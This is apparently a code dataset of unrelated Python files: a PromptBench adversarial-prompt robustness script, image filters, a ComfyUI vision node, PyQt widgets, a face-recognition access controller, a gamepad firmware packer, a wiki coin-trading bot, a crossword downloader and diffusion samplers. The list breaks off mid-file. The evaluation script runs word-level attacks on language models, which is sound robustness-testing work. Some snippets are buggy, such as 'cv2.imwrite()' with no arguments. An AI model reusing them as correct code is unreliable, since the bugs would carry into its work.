    "# Copyright (c) Microsoft Corporation.\n# Licensed under the MIT License.\n\nimport argparse\nimport os\nimport logging\n\nfrom peft import PeftModelForCausalLM\n\nfrom promptbench.dataload import create_dataset\nfrom promptbench.inference import Inference\nfrom promptbench.config import PROMPT_SET_Promptbench_adv as prompt_raw\nfrom promptbench.config import MODEL_SET\n\n\ndef create_logger(log_path):\n\n    logging.getLogger().handlers = []\n\n    logger = logging.getLogger(__name__)\n    logger.setLevel(logging.INFO)\n\n    formatter = logging.Formatter(\n        '%(asctime)s - %(levelname)s - %(message)s')\n\n    file_handler = logging.FileHandler(log_path)\n    file_handler.setFormatter(formatter)\n    file_handler.setLevel(logging.INFO)\n    logger.addHandler(file_handler)\n\n    return logger\n\n\ndef get_args():\n    parser = argparse.ArgumentParser()\n    parser.add_argument('--model', type=str,\n                        default='contrastive_llama', choices=MODEL_SET)     # This project supports contrastive_llama only\n    parser.add_argument(\"--loaded_model\", type=PeftModelForCausalLM, default=None, help=\"Loaded model for contrastive llama eval\")\n    parser.add_argument('--dataset', type=str, default='bool_logic', choices=[\"sst2\", \"cola\", \"qqp\", \"mnli\", \"mnli_matched\", \"mnli_mismatched\", \"qnli\", \"wnli\", \"rte\", \"mrpc\"])\n\n    parser.add_argument('--query_budget', type=float, default=float(\"inf\"))\n    parser.add_argument('--attack', type=str, default='deepwordbug', choices=[\n        'textfooler',\n        'textbugger',\n        'bertattack',\n        'deepwordbug',\n        'checklist',\n        'stresstest',\n        'semantic',\n        'no', \n        'noattack',\n        'clean',\n    ])\n    parser.add_argument(\"--verbose\", type=bool, default=True)\n\n    parser.add_argument('--output_dir', type=str, default='./')\n\n    parser.add_argument('--model_dir', type=str)\n\n    parser.add_argument('--shot', type=int, default=0)\n\n    parser.add_argument('--generate_len', type=int, default=4)\n\n    parser.add_argument('--prompt_selection', action='store_true')\n\n    # Number of samples to run for evaluation\n    parser.add_argument('sample_cnt', type=int, default=300)\n\n    args = parser.parse_args()\n    return args\n\n\ndef attack(args, inference_model, RESULTS_DIR):\n    dataset_name = args.dataset\n\n    prompt_list = prompt_raw[args.attack][dataset_name]\n    for idx, prompt in enumerate(prompt_list):\n        acc, result_df = inference_model.predict(prompt)\n        args.logger.info(f\"Prompt: {prompt}, acc: {acc}%\\n\")\n        with open(RESULTS_DIR+args.save_file_name+f\"_prompt{idx}.txt\", \"a+\") as f:\n            f.write(\"Prompt: {}, acc: {:.2f}%\\n\".format(prompt, acc*100))\n        result_df.to_csv(RESULTS_DIR+args.save_file_name+f\"_prompt{idx}.csv\")\n\n\ndef main(args):\n    save_dir = args.dataset\n\n    save_dir += \"/\"\n\n    LOGS_DIR = os.path.join(args.output_dir, \"logs/\" + save_dir)\n    RESULTS_DIR = os.path.join(args.output_dir, \"results/\" + save_dir + args.attack + \"/\")\n\n    for DIR in [LOGS_DIR, RESULTS_DIR]:\n        if not os.path.isdir(DIR):\n            os.makedirs(DIR)\n\n    file_name = \"len_\" + str(args.generate_len) + \"_\" + str(args.shot) + \"_shot\"\n\n    args.save_file_name = file_name\n\n    data = create_dataset(args.dataset, args.sample_cnt)\n\n    inference_model = Inference(args)\n    args.data = data\n\n    logger = create_logger(LOGS_DIR+file_name+\".log\")\n    logger.info(f\"attack: {args.attack}, dataset: {args.dataset}\\n\")\n    print(f\"attack: {args.attack}, dataset: {args.dataset}\\n\")\n\n    args.logger = logger\n\n    attack(args, inference_model, RESULTS_DIR)\n\n\nif __name__ == '__main__':\n    args = get_args()\n    main(args)\n",
    "import numpy as np\r\nimport cv2\r\nimport matplotlib.pyplot as plt\r\n\r\ndef ideal_low_pass_filter(img, d0):\r\n    dft = np.fft.fft2(img)\r\n    dft_shift = np.fft.fftshift(dft)\r\n\r\n    rows, cols = img.shape\r\n    crow, ccol = int(rows/2), int(cols/2)\r\n    mask = np.zeros((rows, cols), np.uint8)\r\n    for x in range(0, rows):\r\n        for y in range(0, cols):\r\n            d = np.sqrt((crow-x)**2+(ccol-y)**2)\r\n            if d <= d0:\r\n                mask[x, y] = 1\r\n\r\n    plt.subplot(2, 2, 1)\r\n    plt.imshow(img, cmap='gray')\r\n    plt.title('Original Image')\r\n\r\n    plt.subplot(2, 2, 2)\r\n    plt.imshow(np.log(np.abs(dft_shift)), cmap='gray')\r\n    plt.title('Frequency Domain')\r\n\r\n    dft_shift *= mask\r\n    plt.subplot(2, 2, 3)\r\n    plt.imshow(np.log(1 + np.abs(dft_shift)), cmap='gray')\r\n    plt.title('Filtered Frequency Domain')\r\n\r\n    f_ishift = np.fft.ifftshift(dft_shift)\r\n    img_back = np.fft.ifft2(f_ishift)\r\n    img_back = np.abs(img_back)\r\n\r\n    plt.subplot(2, 2, 4)\r\n    plt.imshow(img_back, cmap='gray')\r\n    plt.title('Filtered Image')\r\n\r\n    plt.show()\r\n    return img_back.astype(np.uint8)\r\n\r\n\r\ndef Butterworth_low_pass_filter(img, d0, n):\r\n    dft = np.fft.fft2(img)\r\n    dft_shift = np.fft.fftshift(dft)\r\n\r\n    rows, cols = img.shape\r\n    crow, ccol = int(rows/2), int(cols/2)\r\n    mask = np.zeros((rows, cols))\r\n    for x in range(rows):\r\n        for y in range(cols):\r\n            d = np.sqrt((x-crow)**2 + (y-ccol)**2)\r\n            mask[x, y] = 1 / (1 + (d/d0)**(2*n))\r\n\r\n    plt.subplot(2, 2, 1)\r\n    plt.imshow(img, cmap='gray')\r\n    plt.title('Original Image')\r\n\r\n    plt.subplot(2, 2, 2)\r\n    plt.imshow(np.log(np.abs(dft_shift)), cmap='gray')\r\n    plt.title('Frequency Domain')\r\n\r\n    dft_shift *= mask\r\n    plt.subplot(2, 2, 3)\r\n    plt.imshow(np.log(1 + np.abs(dft_shift)), cmap='gray')\r\n    plt.title('Filtered Frequency Domain')\r\n\r\n    f_ishift = np.fft.ifftshift(dft_shift)\r\n    img_back = np.fft.ifft2(f_ishift)\r\n    img_back = np.abs(img_back)\r\n\r\n    plt.subplot(2, 2, 4)\r\n    plt.imshow(img_back, cmap='gray')\r\n    plt.title('Filtered Image')\r\n\r\n    plt.show()\r\n    return img_back.astype(np.uint8)\r\n\r\ndef Gaussian_low_pass_filter(img, d0):\r\n    dft = np.fft.fft2(img)\r\n    dft_shift = np.fft.fftshift(dft)\r\n    rows, cols = img.shape\r\n    crow, ccol = int(rows/2), int(cols/2)\r\n    mask = np.zeros((rows, cols))\r\n    for x in range(rows):\r\n        for y in range(cols):\r\n            d = (x - crow)**2 + (y - ccol)**2\r\n            mask[x, y] = np.exp(-d / (2 * d0**2))\r\n\r\n    plt.subplot(2, 2, 1)\r\n    plt.imshow(img, cmap='gray')\r\n    plt.title('Original Image')\r\n\r\n    plt.subplot(2, 2, 2)\r\n    plt.imshow(np.log(np.abs(dft_shift)), cmap='gray')\r\n    plt.title('Frequency Domain')\r\n\r\n    dft_shift *= mask\r\n    plt.subplot(2, 2, 3)\r\n    plt.imshow(np.log(1 + np.abs(dft_shift)), cmap='gray')\r\n    plt.title('Filtered Frequency Domain')\r\n\r\n    f_ishift = np.fft.ifftshift(dft_shift)\r\n    img_back = np.fft.ifft2(f_ishift)\r\n    img_back = np.abs(img_back)\r\n\r\n    plt.subplot(2, 2, 4)\r\n    plt.imshow(img_back, cmap='gray')\r\n    plt.title('Filtered Image')\r\n\r\n    plt.show()\r\n    return img_back.astype(np.uint8)\r\n\r\n\r\n# \u8bfb\u53d6\u56fe\u50cf\u5e76\u5e94\u7528\u7406\u60f3\u4f4e\u901a\u6ee4\u6ce2\u5668\r\ngray = cv2.imread(\"1.webp\", cv2.IMREAD_GRAYSCALE)\r\ngray_smooth = Gaussian_low_pass_filter(gray,15)\r\ncv2.imwrite()",
    "#\u53c2\u8003 https://github.com/Hangover3832 \u628a\u6a21\u578b\u653e\u5230\u672c\u5730\uff0ccheckponts\u4e0b\u9762\n\nimport os\nfrom transformers import AutoModelForCausalLM, CodeGenTokenizerFast as Tokenizer\nfrom PIL import Image\nimport torch\nimport gc\nimport numpy as np\nimport folder_paths\n\ncomfy_path = os.path.dirname(folder_paths.__file__)\ncustom_nodes_path = os.path.join(comfy_path, \"custom_nodes\")\n\n# \u6307\u5b9a\u672c\u5730\u5206\u5272\u6a21\u578b\u6587\u4ef6\u5939\u7684\u8def\u5f84\nmodel_folder_path = os.path.join(custom_nodes_path,\"Comfyui_CXH_moondream2\",\"checkpoints\",\"moondream2\")\nmodel_name = \"vikhyatk/moondream2\"\n\nclass Moondream:\n    DEVICES = [\"cpu\", \"gpu\"] if torch.cuda.is_available() else  [\"cpu\"]\n\n    def __init__(self):\n        self.model = None\n        self.tokenizer = None\n\n    @classmethod\n    def INPUT_TYPES(s):\n        return {\n            \"required\": {\n                \"image\": (\"IMAGE\",),\n                \"prompt\": (\"STRING\", {\"multiline\": False, \"default\": \"Please provide a detailed description of this image.\"},),\n                \"device\": (s.DEVICES, {\"default\": s.DEVICES[1]},),\n                \"trust_remote_code\": (\"BOOLEAN\", {\"default\": True},),\n                \"cache\": (\"BOOLEAN\", {\"default\": True},),\n            }\n        }\n\n    RETURN_TYPES = (\"STRING\",)\n    RETURN_NAMES = (\"description\",)\n    FUNCTION = \"gen\"\n    OUTPUT_NODE = False\n    CATEGORY = \"CXH\"\n\n    def gen(self, image:torch.Tensor, prompt:str,  device:str, trust_remote_code:bool,cache:bool):\n        dev = \"cuda\" if device.lower() == \"gpu\" else \"cpu\"\n        if (self.model == None) or (self.tokenizer == None)  or (device != self.device):\n            del self.model\n            del self.tokenizer\n            gc.collect()\n            if (device == \"cpu\") and torch.cuda.is_available():\n                torch.cuda.empty_cache()\n            self.model = None\n            self.tokenizer = None\n            try:\n                self.model = AutoModelForCausalLM.from_pretrained(model_name, trust_remote_code=trust_remote_code,cache_dir=model_folder_path).to(dev)\n            except ValueError:\n                print(\"Moondream: You have to trust remote code to use this node!\")\n                return (\"You have to trust remote code execution to use this node!\",)\n            \n            self.tokenizer = Tokenizer.from_pretrained(model_name,cache_dir=model_folder_path)\n            self.device = device\n\n        descriptions = \"\"\n        \n        for im in image:\n            i = 255. * im.cpu().numpy()\n            img = Image.fromarray(np.clip(i, 0, 255).astype(np.uint8))\n            enc_image = self.model.encode_image(img)\n            answer = self.model.answer_question(enc_image, prompt, self.tokenizer)\n            descriptions += answer\n\n        #\u91ca\u653e\u7f13\u5b58\n        if cache == False:\n            del self.model\n            del self.tokenizer\n            self.model = None\n            self.tokenizer = None\n        \n            \n         \n        return(descriptions,)\n",
    "# coding:utf-8\nfrom PyQt5.QtCore import Qt, QUrl\nfrom PyQt5.QtGui import QPixmap, QDesktopServices\nfrom PyQt5.QtWidgets import QFrame, QLabel, QVBoxLayout, QWidget, QHBoxLayout\n\nfrom qfluentwidgets import IconWidget, FluentIcon, TextWrap, SingleDirectionScrollArea\nfrom ..common.style_sheet import StyleSheet\n\n\nclass LinkCard(QFrame):\n\n    def __init__(self, icon, title, content, url, parent=None):\n        super().__init__(parent=parent)\n        self.url = QUrl(url)\n        self.setFixedSize(198, 220)\n        self.iconWidget = IconWidget(icon, self)\n        self.titleLabel = QLabel(title, self)\n        self.contentLabel = QLabel(TextWrap.wrap(content, 28, False)[0], self)\n        self.urlWidget = IconWidget(FluentIcon.LINK, self)\n\n        self.__initWidget()\n\n    def __initWidget(self):\n        self.setCursor(Qt.PointingHandCursor)\n\n        self.iconWidget.setFixedSize(54, 54)\n        self.urlWidget.setFixedSize(16, 16)\n\n        self.vBoxLayout = QVBoxLayout(self)\n        self.vBoxLayout.setSpacing(0)\n        self.vBoxLayout.setContentsMargins(24, 24, 0, 13)\n        self.vBoxLayout.addWidget(self.iconWidget)\n        self.vBoxLayout.addSpacing(16)\n        self.vBoxLayout.addWidget(self.titleLabel)\n        self.vBoxLayout.addSpacing(8)\n        self.vBoxLayout.addWidget(self.contentLabel)\n        self.vBoxLayout.setAlignment(Qt.AlignLeft | Qt.AlignTop)\n        self.urlWidget.move(170, 192)\n\n        self.titleLabel.setObjectName('titleLabel')\n        self.contentLabel.setObjectName('contentLabel')\n\n    def mouseReleaseEvent(self, e):\n        super().mouseReleaseEvent(e)\n        QDesktopServices.openUrl(self.url)\n\n\nclass LinkCardView(SingleDirectionScrollArea):\n    \"\"\" Link card view \"\"\"\n\n    def __init__(self, parent=None):\n        super().__init__(parent, Qt.Horizontal)\n        self.view = QWidget(self)\n        self.hBoxLayout = QHBoxLayout(self.view)\n\n        self.hBoxLayout.setContentsMargins(36, 0, 0, 0)\n        self.hBoxLayout.setSpacing(12)\n        self.hBoxLayout.setAlignment(Qt.AlignLeft)\n\n        self.setWidget(self.view)\n        self.setWidgetResizable(True)\n        self.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOff)\n        self.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)\n\n        self.view.setObjectName('view')\n        StyleSheet.LINK_CARD.apply(self)\n\n    def addCard(self, icon, title, content, url):\n        \"\"\" add link card \"\"\"\n        card = LinkCard(icon, title, content, url, self.view)\n        self.hBoxLayout.addWidget(card, 0, Qt.AlignLeft)\n",
    "import cv2\nimport serial\nimport time\n\n# Load pre-trained face recognition model\nfaceRecognizer = cv2.face.LBPHFaceRecognizer_create()\nfaceRecognizer.read(\"models/trained_lbph_face_recognizer_model.yml\")\n\n# Load Haarcascade for face detection\nfaceCascade = cv2.CascadeClassifier(\"models/haarcascade_frontalface_default.xml\")\n\nfontFace = cv2.FONT_HERSHEY_SIMPLEX\nfontScale = 0.6\nfontColor = (255, 255, 255)\nfontWeight = 2\nfontBottomMargin = 30\n\nnametagColor = (255, 0, 0)\nnametagHeight = 50\n\nfaceRectangleBorderColor = nametagColor\nfaceRectangleBorderSize = 2\n\n# Open a connection to the Arduino\nser = serial.Serial('/dev/tty.usbmodem2017_2_251', 9600)  # Change port to your Arduino's port\ntime.sleep(2)  # Allow time for Arduino to initialize\n\n# Open a connection to the first webcam\ncamera = cv2.VideoCapture(0)\n\n# Start looping\nwhile True:\n    # Capture frame-by-frame\n    ret, frame = camera.read()\n    if not ret:\n        break\n\n    # Convert frame to grayscale\n    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n\n    # Detect faces\n    faces = faceCascade.detectMultiScale(gray, scaleFactor=1.1, minNeighbors=5, minSize=(30, 30))\n\n    # Control flag for LED\n    is_access_granted = False\n\n    # For each face found\n    for (x, y, w, h) in faces:\n\n        # Recognize the face\n        ID, Confidence = faceRecognizer.predict(gray[y:y + h, x:x + w])\n        # Confidence normalization to a 0-100 scale\n        Confidence = 100 - Confidence\n        if Confidence > 50:\n            if ID == 0:\n                Person = \"pseudo\"\n                is_access_granted = False\n            elif ID == 1:\n                Person = \"Gabriel\"\n                is_access_granted = False\n            elif ID == 2:\n                Person = \"Dalyoung\"\n                is_access_granted = False\n            elif ID == 3:\n                Person = \"Godwill\"\n                is_access_granted = False\n            elif ID == 4:\n                Person = \"Bright\"\n                is_access_granted = False\n            elif ID == 5:\n                Person = \"Bena\"   \n                is_access_granted = False    \n            elif ID == 6:\n                Person = \"Sugira\"   \n                is_access_granted = True   \n        \n            # Create rectangle around the face\n            cv2.rectangle(frame, (x - 20, y - 20), (x + w + 20, y + h + 20), faceRectangleBorderColor, faceRectangleBorderSize)\n\n            # Display name tag\n            cv2.rectangle(frame, (x - 22, y - nametagHeight), (x + w + 22, y - 22), nametagColor, -1)\n            cv2.putText(frame, str(Person) + \": \" + str(round(Confidence, 2)) + \"%\", (x, y-fontBottomMargin), fontFace, fontScale, fontColor, fontWeight)\n\n    # Control\n    if is_access_granted:\n        ser.write(b'1')  # Sending '1' to Arduino to turn on LED\n    else:\n        ser.write(b'0')  # Sending '0' to Arduino to turn off LED\n\n    # Display the resulting frame\n    cv2.imshow('Detecting Faces...', frame)\n\n    # Exit loop when 'q' is pressed\n    if cv2.waitKey(1) & 0xFF == ord('q'):\n        break\n\n# Release the camera\ncamera.release()\n\n# Close the serial connection to the Arduino\n\nser.write(b'0')  # Sending '0' to Arduino to turn off LED\nser.close()\n\n# Close all OpenCV windows\ncv2.destroyAllWindows()\n",
    "#!/usr/bin/env python3\n\"\"\"\nfwpack - Pack/Unpack DRC/DRH firmware files\nCreated in 2024 by GaryOderNichts\n<https://github.com/GaryOderNichts/drc-fw-patches>\n\nCredits to drxtool for the firmware header logic and extracted files structure.\n\"\"\"\n\nimport sys, os\nimport binascii\nimport construct\n\nclass FirmwareType:\n    FIRMWARE_TYPE_DRC = 0x01010000\n    FIRMWARE_TYPE_DRH = 0x00010000\n\nBlobHeader = construct.Struct(\n    \"imageVersion\" / construct.Int32ub,\n    \"blockSize\" / construct.Int32ub,\n    \"sequencePerSession\" / construct.Int32ub,\n    \"imageSize\" / construct.Int32ub,\n)\nassert(BlobHeader.sizeof() == 0x10)\n\nFirmwareHeader = construct.Struct(\n    \"type\" / construct.Int32ul,\n    \"superCRCs\" / construct.Array(4, construct.Int32ul),\n    construct.Padding(0xFE8),\n    \"headerCRC\" / construct.Int32ul,\n    \"subCRCs\" / construct.Array(0x1000, construct.Int32ul),\n)\nassert(FirmwareHeader.sizeof() == 0x5000)\n\nFirmwareSection = construct.Struct(\n    \"offset\" / construct.Int32ul,\n    \"size\" / construct.Int32ul,\n    \"name\" / construct.PaddedString(4, \"ascii\"),\n    \"version\" / construct.Int32ul,\n)\nassert(FirmwareSection.sizeof() == 0x10)\n\nFirmwareFile = construct.Struct(\n    \"blobHeader\" / BlobHeader,\n    \"firmwareHeader\" / FirmwareHeader,\n    \"firmwareData\" / construct.Bytes(construct.this.blobHeader.imageSize - FirmwareHeader.sizeof()),\n)\n\n# Thanks to drxtool for the crctable logic\ndef verify_firmware_header(fw) -> bool:\n    # Verify header CRC\n    header_crc = binascii.crc32(FirmwareHeader.build(fw.firmwareHeader)[0:0xFFC])\n    if header_crc != fw.firmwareHeader.headerCRC:\n        return False\n    \n    # Verify super crcs\n    subcrc_data = construct.Array(0x1000, construct.Int32ul).build(fw.firmwareHeader.subCRCs)\n    for i in range(4):\n        super_crc = binascii.crc32(subcrc_data[i*0x1000:i*0x1000+0x1000])\n        if super_crc != fw.firmwareHeader.superCRCs[i]:\n            return False\n\n    # Verify sub crcs\n    for i in range(len(fw.firmwareData) // 0x1000 + 1):\n        offset = i * 0x1000\n        length = 0x1000\n        if len(fw.firmwareData) - offset < length:\n            length = len(fw.firmwareData) - offset\n\n        sub_crc = binascii.crc32(fw.firmwareData[offset:offset + length])\n        if sub_crc != fw.firmwareHeader.subCRCs[i]:\n            return False\n\n    return True\n\ndef build_firmware_header(blob_type, firmware_data) -> dict:\n    # Calculate CRC for every 0x1000 bytes of firmware data\n    sub_crcs = [0] * 0x1000\n    for i in range(len(firmware_data) // 0x1000 + 1):\n        offset = i * 0x1000\n        length = 0x1000\n        if len(firmware_data) - offset < length:\n            length = len(firmware_data) - offset\n\n        sub_crcs[i] = binascii.crc32(firmware_data[offset:offset + length])\n\n    # Calculate the super CRCs\n    super_crcs = [0] * 4\n    subcrc_data = construct.Array(0x1000, construct.Int32ul).build(sub_crcs)\n    for i in range(4):\n        super_crcs[i] = binascii.crc32(subcrc_data[i*0x1000:i*0x1000+0x1000])\n\n    firmware_header = dict(type=blob_type, superCRCs=super_crcs, headerCRC=0, subCRCs=sub_crcs)\n\n    # Calculate the header CRC\n    firmware_header[\"headerCRC\"] = binascii.crc32(FirmwareHeader.build(firmware_header)[0:0xFFC])\n\n    return firmware_header\n\ndef unpack_firmware(source_file, dest_dir):\n    fw = FirmwareFile.parse_file(source_file)\n    if not verify_firmware_header(fw):\n        print(\"Firmware header verification failed\")\n        sys.exit(1)\n\n    if fw.firmwareHeader.type == FirmwareType.FIRMWARE_TYPE_DRC:\n        print(f\"DRC firmware version 0x{fw.blobHeader.imageVersion:08x}\")\n    elif fw.firmwareHeader.type == FirmwareType.FIRMWARE_TYPE_DRH:\n        print(f\"DRH firmware version 0x{fw.blobHeader.imageVersion:08x}\")\n    else:\n        print(f\"Unsupported firmware type 0x{fw.firmwareHeader.type:08x}\")\n        sys.exit(1)\n\n    if not os.path.isdir(dest_dir):\n        os.mkdir(dest_dir)\n\n    # Write blob header and type\n    BlobHeader.build_file(fw.blobHeader, os.path.join(dest_dir, \"blob_header.bin\"))\n    construct.Int32ul.build_file(fw.firmwareHeader.type, os.path.join(dest_dir, \"blob_type.bin\"))\n\n    # Assume first part of the data is the index\n    index = FirmwareSection.parse(fw.firmwareData)\n\n    # Parse sections\n    sections = construct.Array(index.size // FirmwareSection.sizeof(), FirmwareSection).parse(fw.firmwareData)\n    for s in sections:\n        print(f\"Saving {s.name} version 0x{s.version:08x} offset 0x{s.offset} size 0x{s.size}\")\n\n        # write section to file\n        with open(os.path.join(dest_dir, s.name + \".bin\"), \"wb\") as f:\n            f.write(fw.firmwareData[s.offset:s.offset + s.size])\n\ndef pack_firmware(source_dir, dest_file):\n    # Read blob header and type\n    blob_header = BlobHeader.parse_file(os.path.join(source_dir, \"blob_header.bin\"))\n    blob_type = construct.Int32ul.parse_file(os.path.join(source_dir, \"blob_type.bin\"))\n\n    # Parse sections from INDX\n    firmware_data = b\"\"\n    sections = construct.GreedyRange(FirmwareSection).parse_file(os.path.joi",
    "import requests\nimport json\nimport time\nfrom datetime import datetime\n\n\ndef delay():\n    time.sleep(0.5)\n\n\nclass AutoCoin:\n    def __init__(self):\n        # \uc785\ub825 \ubc1b\ub294 \uac12\n        self.username = input(\"\ubd80\ub9c8\uc704\ud0a4 \uc544\uc774\ub514 \uc785\ub825: \")\n        self.password = input(\"\ubd80\ub9c8\uc704\ud0a4 \ube44\ubc00\ubc88\ud638 \uc785\ub825: \")\n        self.want_buy_price = input(\"\uc6d0\ud558\ub294 \ub9e4\uc218 \uac00\uaca9 \uc544\ub798\ub85c: \")\n        self.want_sell_price = input(\"\uc6d0\ud558\ub294 \ub9e4\ub3c4 \uac00\uaca9 \uc704\ub85c: \")\n\n        self.access_token = None\n        self.access_refreshToken = None\n\n        self.price = 0\n        self.property = 0  # \ud604\uc7ac \uc7ac\uc0b0\n        self.have_coins = 0  # \ud604\uc7ac \ubcf4\uc720 \ucf54\uc778 \uc218\n\n        # URL list\n        self.urls = {\n            \"bsm_login\": \"https://auth.bssm.kro.kr/api/auth/login\",  # \ubd80\ub9c8\uc704\ud0a4\uc5d0 \uc811\uadfc\ud558\uae30 \uc704\ud55c token \uac00\uc838\uc634\n            \"bsm_auth_token\": \"https://auth.bssm.kro.kr/api/oauth/authorize\",  # bsm token\n            \"buma_auth_token\": \"https://buma.wiki/api/auth/oauth/bsm\",  # buman token\n            \"mine\": \"https://buma.wiki/api/coins/mine\",\n            \"coin_price\": \"https://buma.wiki/api/coins/prices\",  # \ubd80\ub9c8\uc704\ud0a4 \ucf54\uc778 \uac00\uaca9 \ud655\uc778\n            \"buy_coin\": \"https://buma.wiki/api/coins/buy\",  # \ucf54\uc778 \ub9e4\uc218\n            \"sell_coin\": \"https://buma.wiki/api/coins/sell\"  # \ucf54\uc778 \ub9e4\ub3c4\n        }\n\n    def show_user_info(self):  # \uc720\uc800\uac00 \uc785\ub825\ud55c \uc815\ubcf4 \ud655\uc778\ud558\ub294 \ud398\uc774\uc9c0\n        text = f\"\"\"\n        \\n\n        ## \uc785\ub825\ub41c \uc815\ubcf4\ub294 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. ## \n\n        \uc720\uc800 \uc774\ub984: {self.username}\n        \uc6d0\ud558\ub294 \ub9e4\uc218 \uac00\uaca9 \uc774\ud558 \uac12: {self.want_buy_price}\n        \uc6d0\ud558\ub294 \ub9e4\ub3c4 \uac00\uaca9 \uc774\uc0c1 \uac12: {self.want_sell_price}\n\n        \"\"\"\n        print(text)\n\n    def main(self):  # \ubd80\ub9c8\uc704\ud0a4 \ub85c\uadf8\uc778 \ud568\uc218\n        try:\n            login_data = {\n                \"id\": str(self.username),\n                \"pw\": str(self.password)\n            }\n            login_response = requests.post(str(self.urls[\"bsm_login\"]), json=login_data)\n\n            if login_response.status_code == 200:\n                login_json_response = login_response.json()\n                self.access_token = login_json_response.get(\"accessToken\")\n                self.access_refreshToken = login_json_response.get(\"refreshToken\")\n\n                # self.show_user_info()\n\n                self.get_token()\n                self.mine()\n                self.get_coin_price()\n\n                if self.price <= int(self.want_buy_price):\n                    self.buy()\n\n                if self.price >= int(self.want_sell_price):\n                    self.sell()\n\n                time.sleep(180)\n\n            else:\n                print(\"\uc720\uc800 \uc815\ubcf4\ub97c \ub2e4\uc2dc \ud655\uc778 \ubc14\ub78d\ub2c8\ub2e4.\")\n                exit()\n\n        except requests.exceptions.RequestException as e:\n            print(\"\uc11c\ubc84\uc5d0 \uc5f0\uacb0\ud560 \uc218 \uc5c6\uc74c.\")\n\n    def get_token(self):  # \ud1a0\ud070 \uac00\uc838\uc624\ub294 \ud568\uc218\n        headers = {\n            'Cookie': f'bsm_auth_refresh_token_v1={self.access_refreshToken}; bsm_auth_token_v1={self.access_token}',\n        }\n\n        data = {\"clientId\": \"22fb2e30\", \"redirectURI\": \"https://buma.wiki/oauth\"}\n        response_auth = requests.post(self.urls[\"bsm_auth_token\"], headers=headers, json=data)\n\n        text = response_auth.text\n        result = text[45:77]\n\n        # token \uc694\uccad\n        headers = {\n            'Cookie': f'bsm_auth_refresh_token_v1={self.access_refreshToken}; bsm_auth_token_v1={self.access_token}',\n            'Authcode': f'{result}',\n        }\n\n        data = {\"clientId\": \"22fb2e30\", \"redirectURI\": \"https://buma.wiki/oauth\"}\n        response_token = requests.post(self.urls[\"buma_auth_token\"], json=data, headers=headers)\n\n        data = response_token.text\n        parsed_data = json.loads(data)\n\n        self.access_token = parsed_data[\"accessToken\"]\n        # print(self.access_token) token \ud655\uc778\n\n    def get_coin_price(self):  # \ucf54\uc778 \uac00\uaca9 \uac00\uc838\uc624\ub294 \ud568\uc218\n        response = requests.get(self.urls[\"coin_price\"])\n\n        if response.status_code == 200:\n            json_data = response.json()\n            self.price = json_data[\"price\"]\n            print(f\"{datetime.now()}  \ucf54\uc778 \uac00\uaca9: {self.price}\")\n        else:\n            print('Failed to retrieve the page. Status code:', response.status_code)\n\n    def mine(self):\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        response = requests.get(self.urls[\"mine\"], headers=headers)\n\n        if response.status_code == 200:\n            json_data = response.json()\n            self.property = json_data[\"money\"]\n            self.have_coins = json_data[\"coin\"]\n        else:\n            print('Failed to retrieve the page. Status code:', response.status_code)\n\n    def buy(self):  # \ub9e4\uc218 \ud568\uc218\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        coin_data = {\n            'coinPrice': self.price,\n            'coinCount': self.property // self.price  # \uc804\uc7ac\uc0b0 // \ud604\uc7ac \uac00\uaca9 = \ud480\ub9e4\uc218\n        }\n\n        coin_response = requests.post(self.urls[\"buy_coin\"], json=coin_data, headers=headers)\n\n        if coin_response.status_code == 200:\n            print(f\"- \ucf54\uc778\uc744 {self.property // self.price}\uc8fc \ub9e4\uc218\ud558\uc600\uc2b5\ub2c8\ub2e4.\\n\")\n\n    def sell(self):  # \ub9e4\ub3c4 \ud568\uc218\n        headers = {\n            \"Authorization\": f\"{self.access_token}\"\n        }\n\n        coin_data = {\n            'coinCount': self.have_coins,\n            'coinPrice': self.price\n      ",
    "# nyt.py\n# get puzzle\nimport requests, datetime, re, json\n\nUA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\"\n\ndef get(cookie0, cookie1):\n    referer = 'https://www.nytimes.com/crosswords/archive/daily'\n    today = datetime.datetime.now().strftime('%m%d%y')\n    headers = {\"cookie\":cookie0, \"User-Agent\":UA, \"Referer\":referer}\n    url = \"https://www.nytimes.com/crosswords\"\n    d = requests.get(url, headers=headers)\n    puzzle_id = re.search(r\"\\\"daily_puzzle\\\"\\:\\[\\{\\\"puzzle_id\\\"\\:(.*?)\\,\", str(d.content)).groups()[0]\n    url = 'https://www.nytimes.com/svc/crosswords/v2/puzzle/'+str(puzzle_id)+'.pdf'\n    headers.update( {\"cookie\":cookie1, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n        'Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Cache-Control': 'no-cache' })\n    d = requests.get(url, headers=headers)\n    if(len(d.content)>1000):\n        f = open('puzzle-%s.pdf' % (today), 'wb')\n        f.write(d.content)\n        f.close()\n        return \"puzzle-%s.pdf\" % (today)\n    else:\n        print(\"problem saving crossword\")\n    return None",
    "import math\r\n\r\nfrom scipy import integrate\r\nimport torch\r\nfrom torch import nn\r\nfrom torchdiffeq import odeint\r\nimport torchsde\r\nfrom tqdm.auto import trange, tqdm\r\n\r\nfrom . import utils\r\n\r\n\r\n\r\ndef append_zero(x):\r\n    return torch.cat([x, x.new_zeros([1])])\r\n\r\n\r\ndef get_sigmas_karras(n, sigma_min, sigma_max, rho=7., device='cpu'):\r\n    \"\"\"Constructs the noise schedule of Karras et al. (2022).\"\"\"\r\n    ramp = torch.linspace(0, 1, n)\r\n    min_inv_rho = sigma_min ** (1 / rho)\r\n    max_inv_rho = sigma_max ** (1 / rho)\r\n    sigmas = (max_inv_rho + ramp * (min_inv_rho - max_inv_rho)) ** rho\r\n    return append_zero(sigmas).to(device)\r\n\r\n\r\ndef get_sigmas_exponential(n, sigma_min, sigma_max, device='cpu'):\r\n    \"\"\"Constructs an exponential noise schedule.\"\"\"\r\n    sigmas = torch.linspace(math.log(sigma_max), math.log(sigma_min), n, device=device).exp()\r\n    return append_zero(sigmas)\r\n\r\n\r\ndef get_sigmas_polyexponential(n, sigma_min, sigma_max, rho=1., 